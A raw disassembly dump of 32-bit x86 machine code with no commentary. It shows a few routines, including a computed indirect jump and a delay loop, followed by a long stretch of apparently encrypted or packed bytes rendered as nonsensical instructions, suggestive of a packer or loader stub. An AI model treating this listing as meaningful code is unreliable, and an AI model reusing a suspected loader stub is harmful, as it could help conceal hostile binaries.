  4153a3:	mov    eax,DWORD PTR [ebp-0x8]
  4153a6:	mov    DWORD PTR [edx],eax
  4153a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4153ab:	add    ecx,DWORD PTR [ebp-0x54]
  4153ae:	mov    DWORD PTR [ebp-0x5c],ecx
  4153b1:	mov    edx,DWORD PTR ds:0x417024
  4153b7:	mov    DWORD PTR [ebp-0x4c],edx
  4153ba:	mov    eax,DWORD PTR [ebp-0x4]
  4153bd:	add    eax,DWORD PTR [ebp-0x14]
  4153c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4153c3:	mov    DWORD PTR [eax+0x4],ecx
  4153c6:	mov    edx,DWORD PTR [ebp-0x4]
  4153c9:	add    edx,DWORD PTR [ebp-0x14]
  4153cc:	mov    DWORD PTR [ebp-0xc],edx
  4153cf:	cmp    DWORD PTR [ebp-0x68],0x0
  4153d3:	jbe    0x4153f0
  4153d5:	mov    eax,DWORD PTR [ebp-0xc]
  4153d8:	push   eax
  4153d9:	mov    ecx,DWORD PTR [ebp-0x14]
  4153dc:	push   ecx
  4153dd:	mov    edx,DWORD PTR [ebp-0x2c]
  4153e0:	add    edx,DWORD PTR [ebp-0x68]
  4153e3:	push   edx
  4153e4:	mov    eax,DWORD PTR [ebp-0x4]
  4153e7:	push   eax
  4153e8:	call   0x41696e
  4153ed:	add    esp,0x10
  4153f0:	cmp    DWORD PTR [ebp-0x5c],0x0
  4153f4:	je     0x415404
  4153f6:	push   DWORD PTR [ebp-0x4c]
  4153f9:	push   DWORD PTR [ebp-0x6c]
  4153fc:	mov    ecx,DWORD PTR [ebp-0x5c]
  4153ff:	push   ecx
  415400:	jmp    ecx
  415402:	jmp    0x41540a
  415404:	mov    ecx,DWORD PTR [ebp+0x8]
  415407:	mov    DWORD PTR [ebp-0x18],ecx
  41540a:	mov    eax,0x1
  41540f:	mov    esp,ebp
  415411:	pop    ebp
  415412:	ret    
  415413:	push   ebp
  415414:	mov    ebp,esp
  415416:	pop    ebp
  415417:	ret    
  415418:	push   ebp
  415419:	mov    ebp,esp
  41541b:	sub    esp,0x54
  41541e:	mov    DWORD PTR [ebp-0x34],0x0
  415425:	mov    DWORD PTR [ebp-0x4],0x0
  41542c:	mov    DWORD PTR [ebp-0x50],0x0
  415433:	mov    DWORD PTR [ebp-0x4c],0x0
  41543a:	mov    DWORD PTR [ebp-0x30],0x0
  415441:	lea    eax,[ebp-0x38]
  415444:	push   eax
  415445:	push   0x8
  415447:	call   DWORD PTR ds:0x417020
  41544d:	call   DWORD PTR ds:0x417014
  415453:	mov    DWORD PTR [ebp-0x30],eax
  415456:	lea    ecx,[ebp-0x48]
  415459:	push   ecx
  41545a:	call   DWORD PTR ds:0x417010
  415460:	mov    edx,DWORD PTR [ebp-0x34]
  415463:	push   edx
  415464:	call   0x415493
  415469:	add    esp,0x4
  41546c:	call   0x41695f
  415471:	mov    DWORD PTR [ebp-0x54],0x0
  415478:	jmp    0x415483
  41547a:	mov    eax,DWORD PTR [ebp-0x54]
  41547d:	add    eax,0x1
  415480:	mov    DWORD PTR [ebp-0x54],eax
  415483:	cmp    DWORD PTR [ebp-0x54],0x64
  415487:	jae    0x41548b
  415489:	jmp    0x41547a
  41548b:	xor    eax,eax
  41548d:	mov    esp,ebp
  41548f:	pop    ebp
  415490:	ret    0x10
  415493:	push   ebp
  415494:	mov    ebp,esp
  415496:	sub    esp,0x3c
  415499:	push   esi
  41549a:	mov    DWORD PTR [ebp-0x3c],0x0
  4154a1:	mov    DWORD PTR [ebp-0x38],0x0
  4154a8:	mov    DWORD PTR [ebp-0x30],0x0
  4154af:	mov    DWORD PTR [ebp-0x24],0x0
  4154b6:	mov    DWORD PTR [ebp-0x1c],0x0
  4154bd:	mov    DWORD PTR [ebp-0x28],0x0
  4154c4:	mov    DWORD PTR [ebp-0x2c],0x448fc8
  4154cb:	mov    DWORD PTR [ebp-0x24],0x5d80e3e9
  4154d2:	mov    DWORD PTR [ebp-0x34],0x0
  4154d9:	mov    eax,DWORD PTR [ebp-0x24]
  4154dc:	mov    DWORD PTR [ebp-0x20],eax
  4154df:	mov    DWORD PTR [ebp-0x4],0x0
  4154e6:	mov    ecx,DWORD PTR ds:0x417014
  4154ec:	mov    DWORD PTR [ebp-0x4],ecx
  4154ef:	push   0x0
  4154f1:	push   0x4e
  4154f3:	push   0x1e
  4154f5:	push   0x0
  4154f7:	push   0xffffffff
  4154f9:	call   DWORD PTR ds:0x41701c
  4154ff:	test   eax,eax
  415501:	je     0x41693e
  415507:	popf   
  415508:	inc    ecx
  415509:	sbb    ch,BYTE PTR [esi+0x9]
  41550c:	and    ecx,esp
  41550e:	dec    ebx
  41550f:	xlat   BYTE PTR ds:[ebx]
  415510:	mov    esp,DWORD PTR [edx]
  415512:	pop    ebp
  415513:	mov    ebp,DWORD PTR [edi]
  415515:	sbb    ecx,DWORD PTR [edx-0x1edef52a]
  41551b:	dec    ebx
  41551c:	ror    DWORD PTR [ebx-0x2f8be2de],cl
  415522:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415528:	dec    ebx
  415529:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  41552f:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415535:	dec    ebx
  415536:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  41553c:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415542:	dec    ebx
  415543:	fisttp DWORD PTR [edx-0x3085a2de]
  415549:	mov    eax,ds:0x28be6e84
  41554e:	sub    al,0x6a
  415550:	imul   ecx,DWORD PTR [edx-0x7baa6f92],0x73
  415557:	jecxz  0x415576
  415559:	sub    dl,BYTE PTR [ecx-0x6d]
  41555c:	and    al,0xb4
  41555e:	stc    
  41555f:	inc    ebx
  415560:	xor    BYTE PTR [ebx+esi*4+0x7a],dl
  415564:	in     al,0x0
  415566:	gs push ebp
  415568:	shr    DWORD PTR [ecx],0xb6
  41556b:	stos   DWORD PTR es:[edi],eax
  41556c:	push   eax
  41556d:	sub    BYTE PTR [edx],bl
  41556f:	lock jb 0x415556
  415572:	dec    esi
  415573:	dec    esi
  415574:	outs   dx,BYTE PTR ds:[esi]
  415575:	mov    dl,0x6b
  415577:	mov    esi,0x5a3846e4
  41557c:	fst    QWORD PTR [esi]
  41557e:	or     BYTE PTR [edx+0xa],0x21
  415582:	loope  0x4155cf
  415584:	ror    DWORD PTR [ebx-0x3944d8de],cl
  41558a:	xchg   ebp,eax
  41558b:	mov    ah,0xc0
  41558d:	jb     0x41558b
  41558f:	(bad)  
  415591:	stos   DWORD PTR es:[edi],eax
  415592:	push   esi
  415593:	sbb    al,0xf3
  415595:	or     al,0xd
  415597:	ds mov ecx,0x4f03d788
  41559d:	xor    ecx,DWORD PTR [esi]
  41559f:	scas   al,BYTE PTR es:[edi]
  4155a0:	adc    DWORD PTR [edi-0xd4a9057],ecx
  4155a6:	mov    bl,0x2f
  4155a8:	adc    dh,BYTE PTR [edx]
  4155aa:	xchg   esi,eax
  4155ab:	(bad)  
  4155ac:	and    eax,0x825805a
  4155b1:	enter  0x5557,0xa4
  4155b5:	pop    ecx
  4155b6:	cmp    al,0x7c
  4155b8:	add    eax,0xda6aff70
  4155bd:	test   al,0xc6
  4155bf:	mov    ebp,0xc4fce1b8
  4155c4:	in     eax,0xab
  4155c6:	push   esi
  4155c7:	sbb    al,0xf3
  4155c9:	or     eax,0x1625520d
  4155ce:	xlat   BYTE PTR ds:[ebx]
  4155cf:	jecxz  0x415640
  4155d1:	and    DWORD PTR [esi],ecx
  4155d3:	mov    ebx,0xf5a9258c
  4155d8:	sub    BYTE PTR [ebp-0x4d],bl
  4155db:	jae    0x41556c
  4155dd:	cdq    
  4155de:	xchg   esi,eax
  4155df:	idiv   BYTE PTR [eax+0x7e4b80c0]
  4155e5:	arpl   WORD PTR [edi+0x4b],dx
  4155e8:	cmp    esp,eax
  4155ea:	cmp    al,0x74
  4155ec:	jge    0x4155e1
  4155ee:	dec    DWORD PTR [edi]
  4155f0:	sbb    eax,0xc0b473b3
  4155f5:	jb     0x4155f3
  4155f7:	loope  0x415644
  4155f9:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4155ff:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415605:	dec    ebx
  415606:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  41560c:	sbb    ecx,DWORD PTR [edx-0x1e9ba592]
  415612:	dec    ebx
  415613:	lahf   
  415614:	mov    ah,BYTE PTR [ecx]
  415616:	pop    ebp
  415617:	adc    bl,BYTE PTR [esi+0xa6ec556]
  41561d:	and    ecx,esp
  41561f:	dec    ebx
  415620:	ror    DWORD PTR [ebx-0x2d8b42de],cl
  415626:	sbb    al,BYTE PTR [ecx-0x1edeff91]
  41562c:	test   eax,0xd9228bd7
  415631:	jb     0x415603
  415633:	sbb    ecx,DWORD PTR [edx+0x5c620a6e]
  415639:	dec    ebx
  41563a:	ror    DWORD PTR [ebx-0x2f8ba2ce],cl
  415640:	sbb    ecx,DWORD PTR [edi-0x5edef592]
  415646:	dec    ebx
  415647:	rcr    DWORD PTR [ebx-0x2d8ba2de],cl
  41564d:	sbb    ecx,DWORD PTR [edx-0x1edff595]
  415653:	dec    ebx
  415654:	ror    DWORD PTR [ebx-0x2e8ba7de],cl
  41565a:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415660:	jnp    0x415641
  415662:	mov    esp,DWORD PTR [edx]
  415664:	pop    ecx
  415665:	je     0x415637
  415667:	adc    DWORD PTR [edx+ebp*2+0xa],esi
  41566b:	and    esp,ecx
  41566d:	or     edx,DWORD PTR [edx-0x75]
  415670:	and    cl,BYTE PTR [ebp+0x74]
  415673:	ror    BYTE PTR [ebx],1
  415675:	mov    ch,BYTE PTR [esi+0xa]
  415678:	and    ecx,esi
  41567a:	dec    ebx
  41567b:	rcr    DWORD PTR [ebx-0x2f8ba2de],cl
  415681:	sbb    ecx,DWORD PTR [edx-0x1edef582]
  415687:	dec    ebx
  415688:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  41568e:	sbb    ecx,DWORD PTR [esi-0x47def992]
  415694:	dec    eax
  415695:	ror    DWORD PTR [ebx-0x2f8062de],cl
  41569b:	dec    esi
  41569c:	mov    ch,0x6e
  41569e:	or     ah,BYTE PTR [ecx]
  4156a0:	loope  0x4156ed
  4156a2:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4156a8:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4156ae:	dec    ebx
  4156af:	shr    DWORD PTR [ebx-0x2f93a2d2],cl
  4156b5:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4156bb:	dec    ebx
  4156bc:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4156c2:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4156c8:	dec    ebx
  4156c9:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4156cf:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4156d5:	dec    ebx
  4156d6:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4156dc:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4156e2:	dec    ebx
  4156e3:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4156e9:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4156ef:	dec    ebx
  4156f0:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4156f6:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4156fc:	dec    ebx
  4156fd:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  415703:	sbb    ecx,DWORD PTR [edx-0x6af0f592]
  415709:	cs stos DWORD PTR es:[edi],eax
  41570b:	jmp    DWORD PTR [edx]
  41570d:	pop    ebp
  41570e:	je     0x4156e0
  415710:	stos   DWORD PTR es:[edi],eax
  415711:	sub    DWORD PTR [esi+0xa],0xd34be131
  415718:	in     eax,dx
  415719:	es pop ebp
  41571b:	je     0x4156f1
  41571d:	sbb    ecx,DWORD PTR [edx-0x2c9db0c2]
  415723:	pop    ds
  415724:	pushf  
  415725:	mov    esp,DWORD PTR [edx]
  415727:	pop    ebp
  415728:	je     0x4156fa
  41572a:	sbb    ebp,DWORD PTR [edx-0x303ef592]
  415730:	cmp    DWORD PTR [eax+0x745d41f9],esp
  415736:	rcr    BYTE PTR [ebx],1
  415738:	jmp    0xd340:0x21210a6e
  41573f:	mov    esi,DWORD PTR [eax+0x5d]
  415742:	je     0x415714
  415744:	jno    0x4156d4
  415746:	outs   dx,BYTE PTR ds:[esi]
  415747:	or     ah,BYTE PTR [ecx]
  415749:	loope  0x415796
  41574b:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  415751:	sbb    ecx,DWORD PTR [edx+0x1210a4e]
  415757:	mov    eax,gs:0x17324eee
  41575d:	rcr    BYTE PTR [ebx],1
  41575f:	mov    ch,BYTE PTR [edx+ecx*1+0x21]
  415763:	loope  0x4157d0
  415765:	fisttp WORD PTR [ebx-0x2f8ba0de]
  41576b:	sbb    esi,DWORD PTR [esi]
  41576d:	push   0xa
  41576f:	and    ecx,esp
  415771:	dec    ebx
  415772:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  415778:	sbb    ecx,DWORD PTR [edx-0x1edeb592]
  41577e:	mov    edx,ebx
  415780:	mov    esp,DWORD PTR [edx]
  415782:	pop    ebp
  415783:	je     0x415755
  415785:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  41578b:	dec    ebx
  41578c:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  415792:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415798:	dec    ebx
  415799:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  41579f:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4157a5:	dec    ebx
  4157a6:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4157ac:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4157b2:	dec    ebx
  4157b3:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4157b9:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4157bf:	dec    ebx
  4157c0:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4157c6:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4157cc:	dec    ebx
  4157cd:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4157d3:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4157d9:	dec    ebx
  4157da:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4157e0:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4157e6:	dec    ebx
  4157e7:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4157ed:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4157f3:	dec    ebx
  4157f4:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4157fa:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415800:	dec    ebx
  415801:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  415807:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  41580d:	dec    ebx
  41580e:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  415814:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  41581a:	dec    ebx
  41581b:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  415821:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415827:	dec    ebx
  415828:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  41582e:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415834:	dec    ebx
  415835:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  41583b:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415841:	dec    ebx
  415842:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  415848:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  41584e:	dec    ebx
  41584f:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  415855:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  41585b:	dec    ebx
  41585c:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  415862:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415868:	dec    ebx
  415869:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  41586f:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415875:	dec    ebx
  415876:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  41587c:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415882:	dec    ebx
  415883:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  415889:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  41588f:	dec    ebx
  415890:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  415896:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  41589c:	dec    ebx
  41589d:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4158a3:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4158a9:	dec    ebx
  4158aa:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4158b0:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4158b6:	dec    ebx
  4158b7:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4158bd:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4158c3:	dec    ebx
  4158c4:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4158ca:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4158d0:	dec    ebx
  4158d1:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4158d7:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4158dd:	dec    ebx
  4158de:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4158e4:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4158ea:	dec    ebx
  4158eb:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4158f1:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  4158f7:	dec    ebx
  4158f8:	ror    DWORD PTR [ebx-0x2f8ba2de],cl
  4158fe:	sbb    ecx,DWORD PTR [edx-0x1edef592]
  415904:	dec    ebx
  415905:	ror    DWORD PTR [ebx-0x2f80ec77],cl
  41590b:	xor    al,0x8a
  41590d:	outs   dx,BYTE PTR ds:[esi]
  41590e:	sbb    ah,BYTE PTR [ecx]
  415910:	loope  0x415973
  415912:	jno    0x415965
  415914:	push   esi
  415915:	loopne 0x415952
  415917:	jecxz  0x415922
  415919:	mov    eax,ds:0x54ce3755
  41591e:	(bad)  
  415920:	ret    0xac7b
  415923:	test   al,0x63
  415925:	or     ch,cl
  415927:	push   ebp
  415928:	jecxz  0x415923
  41592a:	push   0x9
  41592c:	mov    ds:0xe312d849,al
  415931:	mov    es,esp
  415933:	pop    esi
  415934:	imul   ecx,DWORD PTR cs:[edx+eax*1-0x10],0x5461ae02
  41593d:	cld    
  41593e:	push   eax
  41593f:	or     al,0x77
  415941:	dec    esi
  415942:	xor    ebx,DWORD PTR [ecx]
  415944:	mov    ds:0xfacc9f49,al
  415949:	shl    DWORD PTR [ebx-0x67c6da61],0xfe
  415950:	cmp    dh,dh
  415952:	add    eax,0xc14dd922
  415957:	xchg   ebx,eax
  415958:	rol    BYTE PTR [edx+edi*2+0x648c30c4],0x0
  415960:	das    
  415961:	and    ebp,ecx
  415963:	mov    ebx,0x6bc74755
  415968:	cmc    
  415969:	sub    eax,0x934fd473
  41596e:	jle    0x415974
  415970:	cmp    ecx,ecx
  415972:	aas    
  415973:	data16 mov dl,0x3b
  415976:	mov    ebp,0xcb1a9dd5
  41597b:	xchg   ebx,eax
  41597c:	aaa    
  41597d:	cmp    dh,dl
  41597f:	pop    edx
  415980:	aas    
  415981:	test   eax,0x83baeefc
  415986:	xor    dl,cl
  415988:	push   0x402179b5
  41598d:	mov    al,0x78
  41598f:	repz js 0x4159d9
  415992:	(bad)  
  415993:	sbb    eax,0x1ab70f4d
  415998:	std    
  415999:	sub    DWORD PTR [edi],ebp
  41599b:	mov    ch,0x4e
  41599d:	nop
  41599e:	push   edi
  41599f:	int    0x58
  4159a1:	and    BYTE PTR [edi+edx*1+0x73],bl
  4159a5:	outs   dx,BYTE PTR ds:[esi]
  4159a6:	xchg   esi,eax
  4159a7:	cmp    DWORD PTR [ecx+0x36],esi
  4159aa:	shr    al,0x2e
  4159ad:	mov    eax,0x88ce4579
  4159b2:	inc    eax
  4159b3:	mov    WORD PTR [edi+0x4b],gs
  4159b6:	jae    0x4159ef
  4159b8:	in     eax,0xca
  4159ba:	loop   0x415977
  4159bc:	aas    
  4159bd:	retf   0xfcd0
  4159c0:	adc    eax,0x3a02a9cc
  4159c5:	xchg   BYTE PTR [ecx+0x12],cl
  4159c8:	jo     0x415a36
  4159ca:	mov    cl,0xb0
  4159cc:	les    ecx,FWORD PTR [edi-0x28bafef8]
  4159d2:	mov    DWORD PTR [eax],edi
  4159d4:	cmp    al,0x1a
  4159d6:	fistp  DWORD PTR [eax+0x781875cc]
  4159dc:	sub    ch,dl
  4159de:	pop    es
  4159df:	dec    edx
  4159e0:	adc    ecx,DWORD PTR [esi-0xf]
  4159e3:	in     al,0xd6
  4159e5:	(bad)  
  4159e6:	lahf   
  4159e7:	out    0x78,eax
  4159e9:	push   ebx
  4159ea:	das    
  4159eb:	jecxz  0x415996
  4159ed:	or     DWORD PTR [edi-0x2c5d6b81],eax
  4159f3:	in     al,dx
  4159f4:	xor    ecx,DWORD PTR ss:[edx+esi*4]
  4159f8:	aaa    
  4159f9:	addr16 nop
  4159fb:	test   DWORD PTR [ecx+0x2c],ebp
  4159fe:	dec    ecx
  4159ff:	icebp  
  415a00:	mov    esi,0x5e553636
  415a05:	fiadd  WORD PTR [eiz*1-0x23eec219]
  415a0c:	mov    dl,0x41
  415a0e:	jg     0x415a18
  415a10:	mov    eax,DWORD PTR [eax+ecx*1+0x11f544e1]
  415a17:	outs   dx,BYTE PTR ds:[esi]
  415a18:	sbb    BYTE PTR [ebp-0x42],0xfa
  415a1c:	xlat   BYTE PTR ds:[ebx]
  415a1d:	cdq    
  415a1e:	push   eax
  415a1f:	jge    0x415a89
  415a21:	cmp    esp,eax
  415a23:	sahf   
  415a24:	mov    esp,0x3cae24f
  415a29:	lds    ebx,FWORD PTR [edi]
  415a2b:	mov    ebx,0xc218206a
  415a30:	adc    cl,BYTE PTR [ebx-0x6e]
  415a33:	xor    al,0xd1
  415a35:	pushf  
  415a36:	jg     0x415a88
  415a38:	sub    edi,edx
  415a3a:	sub    DWORD PTR [edi+0x518db1bd],esi
  415a40:	and    esp,0x9f78f894
  415a46:	out    0x75,al
  415a48:	xchg   edi,eax
  415a49:	xchg   BYTE PTR [edi+0x3a],ch
  415a4c:	repnz sub ah,BYTE PTR [esi+eax*8-0x6a]
  415a51:	pop    ecx
  415a52:	(bad)  
  415a53:	jmp    0xc949:0x97007c15
  415a5a:	repz add esp,DWORD PTR [ebp-0x33c99607]
  415a61:	(bad)  
  415a62:	mov    ecx,0x1c055e64
  415a67:	sub    cl,bl
  415a69:	or     BYTE PTR [ebx-0x38b1c5f0],al
  415a6f:	or     eax,0x5055c3f
  415a74:	xor    eax,0x1cb4b3d
  415a79:	and    edx,esi
  415a7b:	xchg   edi,eax
  415a7c:	cdq    
  415a7d:	jbe    0x415a6b
  415a7f:	shl    edx,1
  415a81:	std    
  415a82:	adc    edi,DWORD PTR [eax]
  415a84:	cmc    
  415a85:	fcom   DWORD PTR [ebx]
  415a87:	or     al,0xcf
  415a89:	mov    al,0x3f
  415a8b:	xor    DWORD PTR [ebx-0x47],ebx
  415a8e:	and    BYTE PTR [eax+0x4d],0xf6
  415a92:	js     0x415a54
  415a94:	inc    ebp
  415a95:	fcom   QWORD PTR [edi+0x12db2086]
  415a9b:	test   BYTE PTR [eax-0x899cbe5],dl
  415aa1:	cmc    
  415aa2:	(bad)  
  415aa3:	call   0xa97:0x60886b9f
  415aaa:	add    DWORD PTR [edx+0x49],edx
  415aad:	jmp    0x9257:0xcc2cb3cd
  415ab4:	jle    0x415aef
  415ab6:	fidiv  WORD PTR [edx+ebp*8+0x5fc9dc22]
  415abd:	bound  esi,QWORD PTR [ebp-0x5c80f6c7]
  415ac3:	rcl    dl,cl
  415ac5:	mov    edi,0x212a1bd2
  415aca:	xor    al,0xa1
  415acc:	test   ah,ch
  415ace:	cmp    DWORD PTR [ebx+0x2],eax
  415ad1:	fs inc esp
  415ad3:	lock xor esp,DWORD PTR [esi+0x4f7c8ff]
  415ada:	mov    bl,BYTE PTR [ebx]
  415adc:	mov    ebx,DWORD PTR [edx+0x7ae50090]
  415ae2:	(bad)  
  415ae4:	int    0x1d
  415ae6:	sub    eax,0xea552cbc
  415aeb:	dec    edx
  415aec:	arpl   WORD PTR [esi+0x2f3f08ee],bp
  415af2:	popf   
  415af3:	push   edi
  415af4:	sahf   
  415af5:	test   DWORD PTR [esi],0x4509e7de
  415afb:	imul   esi,DWORD PTR [eax-0x35],0xd6ff8ee1
  415b02:	add    DWORD PTR [ebx+0x53],0xbef68c83
  415b09:	xor    BYTE PTR [esi+0x24],bl
  415b0c:	mov    ecx,0x98b73830
  415b11:	push   ebp
  415b12:	sub    ebx,0x50
  415b15:	in     eax,0xe7
  415b17:	rol    BYTE PTR [ecx+0x275405b4],0xe1
  415b1e:	daa    
  415b1f:	push   0x300c0166
  415b24:	adc    eax,0x3e46f1e8
  415b29:	icebp  
  415b2a:	xlat   BYTE PTR ds:[ebx]
  415b2b:	jno    0x415b36
  415b2d:	int3   
  415b2e:	out    0x75,eax
  415b30:	push   ecx
  415b31:	retf   
  415b32:	out    dx,al
  415b33:	scas   eax,DWORD PTR es:[edi]
  415b34:	nop
  415b35:	xor    al,0x7
  415b37:	adc    DWORD PTR [ecx+eax*2+0x4b2e42d8],0x8f3821f2
  415b42:	cmp    BYTE PTR [ecx],dh
  415b44:	hlt    
  415b45:	into   
  415b46:	jp     0x415b2f
  415b48:	jno    0x415b99
  415b4a:	pushf  
  415b4b:	jmp    ecx
  415b4d:	cmp    al,0x50
  415b4f:	scas   eax,DWORD PTR es:[edi]
  415b50:	sub    esi,DWORD PTR [ecx+esi*1-0x9c64205]
  415b57:	mov    cl,0xbc
  415b59:	(bad)  
  415b5a:	fcomp  QWORD PTR [esi]
  415b5c:	in     al,0x9a
  415b5e:	scas   al,BYTE PTR es:[edi]
  415b5f:	pop    es
  415b60:	xor    eax,0x581eccf2
  415b65:	xlat   BYTE PTR ds:[ebx]
  415b66:	test   DWORD PTR [edx+0x70e1b9a7],edx
  415b6c:	adc    al,0x9e
  415b6e:	sbb    DWORD PTR ss:[ebx+0x5e5d98f6],edx
  415b75:	addr16 dec eax
  415b77:	mov    esp,0x51640284
  415b7c:	loopne 0x415bdc
  415b7e:	js     0x415bed
  415b80:	test   eax,0x410e66fa
  415b85:	pushf  
  415b86:	pop    eax
  415b87:	adc    cl,BYTE PTR [edx-0x7f909e1f]
  415b8d:	test   BYTE PTR [edi],cl
  415b8f:	(bad)  
  415b90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b91:	bound  ebp,QWORD PTR [edx]
  415b93:	pop    ss
  415b94:	jmp    0x415b32
  415b96:	stos   BYTE PTR es:[edi],al
  415b97:	mov    al,0xb2
  415b99:	jecxz  0x415bea
  415b9b:	push   ebx
  415b9c:	jae    0x415b85
  415b9e:	div    BYTE PTR [ebx-0xcbedf1]
  415ba4:	mov    edx,0xbebb29fc
  415ba9:	fdivr  DWORD PTR [eax+0x1a67b3d2]
  415baf:	mov    dh,0x81
  415bb1:	outs   dx,DWORD PTR ds:[esi]
  415bb2:	push   0xffffff8b
  415bb4:	fld    DWORD PTR [ecx-0xc]
  415bb7:	ins    BYTE PTR es:[edi],dx
  415bb8:	es dec esp
  415bba:	push   DWORD PTR [ebx+0x41]
  415bbd:	(bad)  
  415bbf:	dec    esp
  415bc0:	mov    cl,0xc7
  415bc2:	(bad)  
  415bc3:	sbb    dl,BYTE PTR [ebx]
  415bc5:	fidiv  DWORD PTR [ebp-0x53b8b2e7]
  415bcb:	sub    eax,0x998bf375
  415bd0:	les    esp,FWORD PTR [esi]
  415bd2:	loopne 0x415bf8
  415bd4:	test   BYTE PTR [eax],al
  415bd6:	mov    al,0xa5
  415bd8:	fs jnp 0x415bb0
  415bdb:	mov    cs,ebp
  415bdd:	jecxz  0x415b6f
  415bdf:	push   ebp
  415be0:	adc    eax,0x7a23bd9d
  415be5:	xchg   esi,eax
  415be6:	cld    
  415be7:	enter  0xa7b5,0xbb
  415beb:	je     0x415c2f
  415bed:	mov    esp,0x35faf8dd
  415bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bf3:	mov    dh,0xf0
  415bf5:	pushf  
  415bf6:	mov    esp,0x2245d5b4
  415bfb:	out    0x21,al
  415bfd:	adc    al,0xf
  415bff:	and    esi,DWORD PTR [edi+0x1a6656b2]
  415c05:	jb     0x415ba2
  415c07:	call   0x3ddc54af
  415c0c:	popa   
  415c0d:	sub    eax,0x30c2addf
  415c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c13:	arpl   WORD PTR [esp+ecx*1+0x39],bx
  415c17:	push   esi
  415c18:	dec    ebp
  415c19:	ins    BYTE PTR es:[edi],dx
  415c1a:	sahf   
  415c1b:	or     BYTE PTR [ebx+0x900ff96],ah
  415c21:	xor    eax,0x272240bb
  415c26:	sbb    BYTE PTR [esi+0x4a],0x88
  415c2a:	jge    0x415c4f
  415c2c:	xchg   edx,eax
  415c2d:	jp     0x415c46
  415c2f:	push   es
  415c30:	mov    edi,0xd41585be
  415c35:	fmul   DWORD PTR [eax]
  415c37:	mov    ecx,0x66a680dd
  415c3c:	dec    ecx
  415c3d:	pop    ebx
